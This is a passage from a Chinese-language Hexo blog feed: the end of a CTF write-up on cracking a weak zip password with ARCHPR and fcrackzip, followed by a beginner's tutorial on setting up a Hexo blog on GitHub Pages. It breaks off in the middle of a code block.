src="https://img-blog.csdnimg.cn/20200322180557642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我用ARCHPR爆破，直接爆出来了密码7639<br>然后打开压缩包里的TXT文本<br><img src="https://img-blog.csdnimg.cn/20200322180803544.png" alt="Augenstern" loading="lazy"><br>拿到flag。<br>还有一种方法，使用binwalk，这个需要kali了<br>我安装好kali还没用过呢，今天来试试……<br><img src="https://img-blog.csdnimg.cn/20200322184244240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我已经拖进来了（下载vmtools就行，真方便），并且重命名了这个，<br>kali不需要下载binwalk，直接用，<br><img src="https://img-blog.csdnimg.cn/20200322184924663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>原谅我愚蠢的打开方式，因为我真的不会那些命令，回头再学，<br><img src="https://img-blog.csdnimg.cn/20200322185920803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用fcrackzip来爆破密码，fcrackzip可以暴力破解zip密码，对弱密码非常有效；<br><img src="https://img-blog.csdnimg.cn/20200322192346332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>没找到，，，，，emmmmmmm，我是按照师傅们的步骤来的啊，奇怪。那就回头在研究，先把物理机里分离出来的压缩包拖到虚拟机里，然后再拖到终端，试试，我jio得可行<br><img src="https://img-blog.csdnimg.cn/20200322192627359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>有，啊哈哈。破解出来了。跟第一个方法破解出来的一模一样，hhh，可以打开压缩包。拿到flag了。<br>不行了，我不写了。累死了，一下午了，我肝疼，不能写了，就两道吧。感慨一句，kali真是个好东西。不枉我十二个小时奋战把它搞出来，没让我失望。kali牛皮！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建hexo+Github个人博客及遇到的问题</title>
      <link href="/2020/08/23/%E6%90%AD%E5%BB%BAhexo+GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2020/08/23/%E6%90%AD%E5%BB%BAhexo+GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>在假期期间，我尝试搭建自己的博客，网上有各种视频教程，我是跟着学长给我推荐的B站上教程一步一步做的，我也看了学长之前搭建时的笔记。我在搭建时也遇到了问题，然后我都记录了下来，做个笔记吧。</p><h3 id="（1）安装node-js"><a href="#（1）安装node-js" class="headerlink" title="（1）安装node.js"></a>（1）安装node.js</h3><p>到官网去下载<code>12.14.1 LTS</code>版本的，下载好之后，在文件中打开<code>Node.js Setup</code> 。一直选择<strong>next</strong>到结束。这里提示一下，最好不要改路径，<strong>一直点next就行</strong>，如果自己改路径的话，<strong>有可能会出错</strong>，所以保险起见还是不要更改它的默认路径了。安装好之后打开<strong>cmd</strong>输入<code>node -v</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\18101&gt;<span class="selector-tag">node</span> <span class="selector-tag">-v</span></span><br><span class="line"><span class="selector-tag">v12</span><span class="selector-class">.14</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure><p>好了，这就算安装成功了。</p><h3 id="创建一个github账户"><a href="#创建一个github账户" class="headerlink" title="创建一个github账户"></a>创建一个github账户</h3><p>进入github官网<br>把username,email,password,填写过后注册就可以了，Username自己随便设置，能记住就行，一般都是用英文字母。账户创建完成后，点<code>Create a new repository</code>创建一个新仓库。<img src="https://img-blog.csdnimg.cn/20200129210415671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>Repository name格式推荐写成<code>username.github.io</code>例如<code>zxcv0221.github.io</code><br>记得把Initialize this repository with a README前面的框点上对勾。然后点下面的绿色框<code>Create repository</code>就创建成功了。<br>然后在github创建第一个新的项目，根据网上大佬的视频教程，我跟着做，前面没什么错误，但是后面最后一步出错了，页面是下面的图：<img src="https://img-blog.csdnimg.cn/20200118105029128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>项目创建好了就是上面那个样子，我这一步还是没错的，但是我跟着教程上所说的“复制我的链接”也就是<code>用户名.github.io</code>我看到视频中的是直接粘到浏览器上打开，但是我跟着做却打不开网页，<img src="https://img-blog.csdnimg.cn/20200118105805704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>出错了，我看学长的博客里写到这一点了，他当时遇到的问题也是打不开网页，他那个情况估计是网站有延迟，所以解决办法就是等，他的网页在第二天就可以打开了。但我的这个又不一样了，我同样是尝试他的办法，结果还是不行，我就把那个新建的库删了重新建，如此六遍，都没有得到我想要的结果，然后就去百度，各种浏览器都试试，还是没成功，然后我加了一个群去问群里的大佬，过程是非常曲折，好在最后解决了，其实也很简单，就是在链接的前面加上<code>https://</code>就可以打开了。<br>综上有三种情况，1.慢慢等，2.删了重建，所有步骤再来一遍。3.就是在前面加<code>https://</code>。<br>这个答案虽然简单，但对于像我这样的小白来说，也可能会考虑不到，所以就写了出来。</p><h5 id="删库方法"><a href="#删库方法" class="headerlink" title="删库方法"></a>删库方法</h5><p>这个过程可能需要多次尝试，这样就避免不了删库，但是我不会删库，果然伟大的度娘是可以解决任何“疑难杂症”的。<br>第一步，点击<strong>Settings</strong><img src="https://img-blog.csdnimg.cn/20200130012258168.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>第二步，向下滑到最底端找到Delete the repository，点击就可以删除这个库了。<img src="https://img-blog.csdnimg.cn/20200130012505232.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h3 id="安装git-for-windows"><a href="#安装git-for-windows" class="headerlink" title="安装git for windows"></a>安装git for windows</h3><p>仍然是去官网下载安装包，下载过程可能会非常慢，耐心等待。下载完毕后安装，老规矩就别改路径了，避免不必要的麻烦，记住千万不要一直点next，先看看，安装过程中有一步是，<code>Use windows default console window</code>这个要选上。其他倒没什么，只需next 就行了。安装完毕后打开cmd输入git</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\18101&gt;<span class="selector-tag">git</span></span><br><span class="line"><span class="selector-tag">usage</span>: <span class="selector-tag">git</span> <span class="selector-attr">[--version]</span> <span class="selector-attr">[--help]</span> <span class="selector-attr">[-C &lt;path&gt;]</span> <span class="selector-attr">[-c &lt;name&gt;=&lt;value&gt;]</span></span><br><span class="line">           <span class="selector-attr">[--exec-path[=&lt;path&gt;]</span>] <span class="selector-attr">[--html-path]</span> <span class="selector-attr">[--man-path]</span> <span class="selector-attr">[--info-path]</span></span><br><span class="line">           <span class="selector-attr">[-p | --paginate | -P | --no-pager]</span> <span class="selector-attr">[--no-replace-objects]</span> <span class="selector-attr">[--bare]</span></span><br><span class="line">           <span class="selector-attr">[--git-dir=&lt;path&gt;]</span> <span class="selector-attr">[--work-tree=&lt;path&gt;]</span> <span class="selector-attr">[--namespace=&lt;name&gt;]</span></span><br><span class="line">           &lt;<span class="selector-tag">command</span>&gt; <span class="selector-attr">[&lt;args&gt;]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">These</span> <span class="selector-tag">are</span> <span class="selector-tag">common</span> <span class="selector-tag">Git</span> <span class="selector-tag">commands</span> <span class="selector-tag">used</span> <span class="selector-tag">in</span> <span class="selector-tag">various</span> <span class="selector-tag">situations</span>:</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">start</span> <span class="selector-tag">a</span> <span class="selector-tag">working</span> <span class="selector-tag">area</span> (<span class="selector-tag">see</span> <span class="selector-tag">also</span>: <span class="selector-tag">git</span> <span class="selector-tag">help</span> <span class="selector-tag">tutorial</span>)</span><br><span class="line">   <span class="selector-tag">clone</span>      <span class="selector-tag">Clone</span> <span class="selector-tag">a</span> <span class="selector-tag">repository</span> <span class="selector-tag">into</span> <span class="selector-tag">a</span> <span class="selector-tag">new</span> <span class="selector-tag">directory</span></span><br><span class="line">   <span class="selector-tag">init</span>       <span class="selector-tag">Create</span> <span class="selector-tag">an</span> <span class="selector-tag">empty</span> <span class="selector-tag">Git</span> <span class="selector-tag">repository</span> <span class="selector-tag">or</span> <span class="selector-tag">reinitialize</span> <span class="selector-tag">an</span> <span class="selector-tag">existing</span> <span class="selector-tag">one</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">work</span> <span class="selector-tag">on</span> <span class="selector-tag">the</span> <span class="selector-tag">current</span> <span class="selector-tag">change</span> (<span class="selector-tag">see</span> <span class="selector-tag">also</span>: <span class="selector-tag">git</span> <span class="selector-tag">help</span> <span class="selector-tag">everyday</span>)</span><br><span class="line">   <span class="selector-tag">add</span>        <span class="selector-tag">Add</span> <span class="selector-tag">file</span> <span class="selector-tag">contents</span> <span class="selector-tag">to</span> <span class="selector-tag">the</span> <span class="selector-tag">index</span></span><br><span class="line">   <span class="selector-tag">mv</span>         <span class="selector-tag">Move</span> <span class="selector-tag">or</span> <span class="selector-tag">rename</span> <span class="selector-tag">a</span> <span class="selector-tag">file</span>, <span class="selector-tag">a</span> <span class="selector-tag">directory</span>, <span class="selector-tag">or</span> <span class="selector-tag">a</span> <span class="selector-tag">symlink</span></span><br><span class="line">   <span class="selector-tag">reset</span>      <span class="selector-tag">Reset</span> <span class="selector-tag">current</span> <span class="selector-tag">HEAD</span> <span class="selector-tag">to</span> <span class="selector-tag">the</span> <span class="selector-tag">specified</span> <span class="selector-tag">state</span></span><br><span class="line">   <span class="selector-tag">rm</span>         <span class="selector-tag">Remove</span> <span class="selector-tag">files</span> <span class="selector-tag">from</span> <span class="selector-tag">the</span> <span class="selector-tag">working</span> <span class="selector-tag">tree</span> <span class="selector-tag">and</span> <span class="selector-tag">from</span> <span class="selector-tag">the</span> <span class="selector-tag">index</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">examine</span> <span class="selector-tag">the</span> <span class="selector-tag">history</span> <span class="selector-tag">and</span> <span class="selector-tag">state</span> (<span class="selector-tag">see</span> <span class="selector-tag">also</span>: <span class="selector-tag">git</span> <span class="selector-tag">help</span> <span class="selector-tag">revisions</span>)</span><br><span class="line">   <span class="selector-tag">bisect</span>     <span class="selector-tag">Use</span> <span class="selector-tag">binary</span> <span class="selector-tag">search</span> <span class="selector-tag">to</span> <span class="selector-tag">find</span> <span class="selector-tag">the</span> <span class="selector-tag">commit</span> <span class="selector-tag">that</span> <span class="selector-tag">introduced</span> <span class="selector-tag">a</span> <span class="selector-tag">bug</span></span><br><span class="line">   <span class="selector-tag">grep</span>       <span class="selector-tag">Print</span> <span class="selector-tag">lines</span> <span class="selector-tag">matching</span> <span class="selector-tag">a</span> <span class="selector-tag">pattern</span></span><br><span class="line">   <span class="selector-tag">log</span>        <span class="selector-tag">Show</span> <span class="selector-tag">commit</span> <span class="selector-tag">logs</span></span><br><span class="line">   <span class="selector-tag">show</span>       <span class="selector-tag">Show</span> <span class="selector-tag">various</span> <span class="selector-tag">types</span> <span class="selector-tag">of</span> <span class="selector-tag">objects</span></span><br><span class="line">   <span class="selector-tag">status</span>     <span class="selector-tag">Show</span> <span class="selector-tag">the</span> <span class="selector-tag">working</span> <span class="selector-tag">tree</span> <span class="selector-tag">status</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">grow</span>, <span class="selector-tag">mark</span> <span class="selector-tag">and</span> <span class="selector-tag">tweak</span> <span class="selector-tag">your</span> <span class="selector-tag">common</span> <span class="selector-tag">history</span></span><br><span class="line">   <span class="selector-tag">branch</span>     <span class="selector-tag">List</span>, <span class="selector-tag">create</span>, <span class="selector-tag">or</span> <span class="selector-tag">delete</span> <span class="selector-tag">branches</span></span><br><span class="line">   <span class="selector-tag">checkout</span>   <span class="selector-tag">Switch</span> <span class="selector-tag">branches</span> <span class="selector-tag">or</span> <span class="selector-tag">restore</span> <span class="selector-tag">working</span> <span class="selector-tag">tree</span> <span class="selector-tag">files</span></span><br><span class="line">   <span class="selector-tag">commit</span>     <span class="selector-tag">Record</span> <span class="selector-tag">changes</span> <span class="selector-tag">to</span> <span class="selector-tag">the</span> <span class="selector-tag">repository</span></span><br><span class="line">   <span class="selector-tag">diff</span>       <span class="selector-tag">Show</span> <span class="selector-tag">changes</span> <span class="selector-tag">between</span> <span class="selector-tag">commits</span>, <span class="selector-tag">commit</span> <span class="selector-tag">and</span> <span class="selector-tag">working</span> <span class="selector-tag">tree</span>, <span class="selector-tag">etc</span></span><br><span class="line">   <span class="selector-tag">merge</span>      <span class="selector-tag">Join</span> <span class="selector-tag">two</span> <span class="selector-tag">or</span> <span class="selector-tag">more</span> <span class="selector-tag">development</span> <span class="selector-tag">histories</span> <span class="selector-tag">together</span></span><br><span class="line">   <span class="selector-tag">rebase</span>     <span class="selector-tag">Reapply</span> <span class="selector-tag">commits</span> <span class="selector-tag">on</span> <span class="selector-tag">top</span> <span class="selector-tag">of</span> <span class="selector-tag">another</span> <span class="selector-tag">base</span> <span class="selector-tag">tip</span></span><br><span class="line">   <span class="selector-tag">tag</span>        <span class="selector-tag">Create</span>, <span class="selector-tag">list</span>, <span class="selector-tag">delete</span> <span class="selector-tag">or</span> <span class="selector-tag">verify</span> <span class="selector-tag">a</span> <span class="selector-tag">tag</span> <span class="selector-tag">object</span> <span class="selector-tag">signed</span> <span class="selector-tag">with</span> <span class="selector-tag">GPG</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">collaborate</span> (<span class="selector-tag">see</span> <span class="selector-tag">also</span>: <span class="selector-tag">git</span> <span class="selector-tag">help</span> <span class="selector-tag">workflows</span>)</span><br><span class="line">   <span class="selector-tag">fetch</span>      <span class="selector-tag">Download</span> <span class="selector-tag">objects</span> <span class="selector-tag">and</span> <span class="selector-tag">refs</span> <span class="selector-tag">from</span> <span class="selector-tag">another</span> <span class="selector-tag">repository</span></span><br><span class="line">   <span class="selector-tag">pull</span>       <span class="selector-tag">Fetch</span> <span class="selector-tag">from</span> <span class="selector-tag">and</span> <span class="selector-tag">integrate</span> <span class="selector-tag">with</span> <span class="selector-tag">another</span> <span class="selector-tag">repository</span> <span class="selector-tag">or</span> <span class="selector-tag">a</span> <span class="selector-tag">local</span> <span class="selector-tag">branch</span></span><br><span class="line">   <span class="selector-tag">push</span>       <span class="selector-tag">Update</span> <span class="selector-tag">remote</span> <span class="selector-tag">refs</span> <span class="selector-tag">along</span> <span class="selector-tag">with</span> <span class="selector-tag">associated</span> <span class="selector-tag">objects</span></span><br><span class="line"></span><br><span class="line">&#x27;git help -a&#x27; and &#x27;git help -g&#x27; list available subcommands and some</span><br><span class="line">concept guides. See &#x27;git help &lt;command&gt;&#x27; or &#x27;git help &lt;concept&gt;&#x27;</span><br><span class="line"><span class="selector-tag">to</span> <span class="selector-tag">read</span> <span class="selector-tag">about</span> <span class="selector-tag">a</span> <span class="selector-tag">specific</span> <span class="selector-tag">subcommand</span> <span class="selector-tag">or</span> <span class="selector-tag">concept</span>.</span><br></pre></td></tr></table></figure><p>会出现这些，这就代表已经安装完了。</p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>由于后面要用到一些插件，所以干脆就提前安装吧，这里需要安装的插件是<strong>hexo-deployer-git</strong><br>打开cmd输入<code>npm install hexo-deployer-git --save</code>就可以安装了。</p><h3 id="配置github-ssh"><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h3><p>在你下载git for Windows的文件夹中找到并打开git-base.exe,在命令行输入<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code>然后一直按回车。<br>然后打开GitHub官网，点击头像，点击Settings,再点击SSH and GOG keys,点击NEW SSH KEY ,title的名字就是你的用户名，然后key的话，根据路径<code>C:\Users\用户名\.ssh</code>，用记事本打开<code>id_rsa.pub</code>这个文件,把里面的代码复制并粘贴到key上就🆗了。</p><h3 id="本地安装hexo"><a href="#本地安装hexo" class="headerlink" title="本地安装hexo"></a>本地安装hexo</h3><p>本地安装hexo前，应该先创建一个新文件夹，这个文件夹建议设在D盘下，因为搭建一次可能不成功，需要删除重新来，文件名字可以随便起。然后打开cmd，输入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\18101&gt;<span class="selector-tag">D</span>:</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">D</span>:\&gt;<span class="selector-tag">cd</span> <span class="selector-tag">blog</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">D</span>:\<span class="selector-tag">blog</span>&gt;</span><br></pre></td></tr></table></figure><p>这样就就进入到这个文件夹里了，再输入一条这样的命令<code>npm install hexo-cil -g</code>就可以安装hexo了，安装好之后再输入命令<code>hexo init 博客昵称</code>，等待加载完毕后，输入<code>cd 博客名</code>，再进入你的文件夹。输入<code>npm install</code>好了，现在就静等安装就🆗了。<br>安装好了可以运行一下试试，再输入<code>hexo  s</code>看看有没有出现</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">INFO</span>  <span class="selector-tag">Start</span> <span class="selector-tag">processing</span></span><br><span class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><p>然后，复制这个链接在浏览器中打开，如果有画面，就证明已经成功了。（因为我当时做的时候没有截图，不过只要是出现画面了，就是成功了。）</p><h3 id="文本编译器下载"><a href="#文本编译器下载" class="headerlink" title="文本编译器下载"></a>文本编译器下载</h3><p>一个好的文本编译器是很重要的，编译器有好多种，大家可以根据自己的喜好来选择。我用的是sublime ，下载的话，去官网下载就行了，过程可能有点慢。<br>下载好之后，打开hexo 所在的文件，把它直接拖进sublime里面，像这样。<br><img src="https://img-blog.csdnimg.cn/2020013100430973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>现在，找到<code>/* _config.yml</code>,打开这个文件，往下滑到最底端，<br><img src="https://img-blog.csdnimg.cn/20200131005627268.png" alt="在这里插入图片描述" loading="lazy"><br>根据自己的个人信息改成这个格式就可以了，我的是已经改过的。<br>还有一处是需要改的，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16|url: http://zxcv0221.github.io</span><br></pre></td></tr></table></figure><p>改完之后记得保存。<br>打开cmd输入<code>hexo g</code>回车，等到可以再次输入时，输入<code>hexo d</code>,到这里上面下载的插件就起到作用了。这个过程比较慢，耐心等待。<br>然后再输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git  config --global user.email <span class="string">&quot;你的邮件&quot;</span></span><br><span class="line">git  config --global user.name <span class="string">&quot;你的用户名&quot;</span></span><br><span class="line">再输入 hexo d</span><br><span class="line">就会弹出一个登录界面，输入个人的用户名和密码就可以了。</span><br></pre></td></tr></table></figure><p>这里一般情况下就算完成了，emmmmm,进行顺利的话就可以进入自己的博客了。<br>但是我的跟这个不一样，我的输入<code>hexo d</code>后是这样的：<img src="https://img-blog.csdnimg.cn/2020020101181537.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>上面说<code>fatal:unable to auto-detect email address</code>然后我就上百度查，解决方法如下：<br>1.打开“此电脑”——&gt;点击“查看”——&gt;勾选“隐藏的文件名”<br><img src="https://img-blog.csdnimg.cn/20200201012648597.jpg" alt="在这里插入图片描述" loading="lazy"><br>2.进入我们博客目录的“.deploy_git.git”子目录，找到config文件。<br>3.打开config文件，添加下面的内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>|[user]</span><br><span class="line"><span class="number">2</span>|     email=你的邮箱</span><br><span class="line"><span class="number">3</span>|     name=Github用户名</span><br></pre></td></tr></table></figure><p>保存即可，到这里问题就解决了。</p><h4 id="hexo-d后出现-ERROR-Deployer-not-found-git"><a href="#hexo-d后出现-ERROR-Deployer-not-found-git" class="headerlink" title="hexo d后出现    ERROR Deployer not found: git"></a>hexo d后出现    ERROR Deployer not found: git</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d</span><br><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure><p>只需输入</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><p>即可解决。</p><h4 id="更换博客主题"><a href="#更换博客主题" class="headerlink" title="更换博客主题"></a>更换博客主题</h4><p>刚建好的hexo博客主题是默认的，我们需要修改这个主题，hexo有很多主题，可以挑一个自己喜欢的。<a href="https://hexo.io/zh-cn/docs/setup">可以点击这里挑hexo主题</a><br>以Annie主题为例<br>1.下载主题<br>找到hexo文件所在的位置，找到themes，右键单击，选择在<code>Git Bash Here</code>打开。<br><img src="https://img-blog.csdnimg.cn/2020020118125823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后输入<code>git clone 主题链接</code>可以下载主题，我这里就是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:<span class="comment">//github.com/Sariay/hexo-theme-Annie.git</span></span><br></pre></td></tr></table></figure><p>等待安装。然后可以查看一下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">hexo-theme-Annie/  landscape/</span><br></pre></td></tr></table></figure><p>3.然后修改你博客根目录下的_config.yml文件里的theme配置来更换使用的主题</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https:<span class="comment">//hexo.io/plugins/</span></span><br><span class="line">## Themes: https:<span class="comment">//hexo.io/themes/</span></span><br><span class="line">theme: hexo-theme-Annie</span><br></pre></td></tr></table></figure><p><strong>注意格式，该空格的地方记得要空格</strong>。<br>4.本地预览</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>会出现一个链接（端口号一般是4000），复制链接到浏览器中打开就可以看到更改后的主题了。<br>5.上传主题</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span 